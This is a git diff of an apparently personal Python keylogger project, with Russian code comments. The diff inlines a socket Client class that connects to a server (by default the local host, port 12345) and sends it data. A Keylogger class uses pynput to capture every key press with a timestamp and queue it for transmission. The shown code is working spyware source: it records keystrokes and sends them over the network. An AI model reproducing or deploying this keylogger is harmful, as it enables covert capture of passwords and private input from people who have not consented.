@@ -1,12 +1,48 @@
 import socket as sock
-import os
 import logging
 import datetime
 
-from typing import List
+from typing import List, Optional
 from pynput.keyboard import Key, Listener
 
-from client import Client
+
+class Client:
+    def __init__(self, host: str = sock.gethostname(), port: int = 12345) -> None: 
+        self._host: str = host
+        self._port: str = port
+
+        self.client: sock.socket = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
+
+        # настройки логгера
+        path_to_log: str = "D:\\Coding\\PYTHON\\big_projects\\keylogger\\keylogger\\client_logs.log"
+        logging.basicConfig(level=logging.INFO, filename=path_to_log, filemode='w')
+
+        try:
+            self.client.connect((self._host, self._port))  # подключение к адресу серверного сокета
+        except sock.error as err:
+            self.client.close()  # закрытие сокета в случае ошибки
+            logging.critical(f"Client connecting to server failed: {err}")
+        else:
+            logging.info("connected.")
+
+
+    def __str__(self) -> str:
+        return f"host: {self._host}; port: {self._port}"
+    
+
+    def send(self, data: str | List[str]) -> Optional[str]: 
+        if type(data) == list:
+            data = "".join(data)
+
+        try:
+            self.client.send(data.encode())  # отправка данных на сервер
+        except sock.error as err:
+            self.client.close()
+            logging.critical(f"Sending data failed: {err}")
+
+        
+    def close(self) -> None:
+        self.client.close()
 
 
 class Keylogger: 
@@ -41,7 +77,7 @@ class Keylogger:
 
             mes: str = f'[{cur_date}] {cur_time} - key: \"{k}\"\n'  # лог о нажатии, идущий на сервер
             keys.append(mes)  
-            logging.info(f'[+] [{cur_date}] {cur_time} - key: \"{k}\"\n')
+            logging.info(f'[+] [{cur_date}] {cur_time} - key: \"{k}\"')
 
             nonlocal count
             count += 1
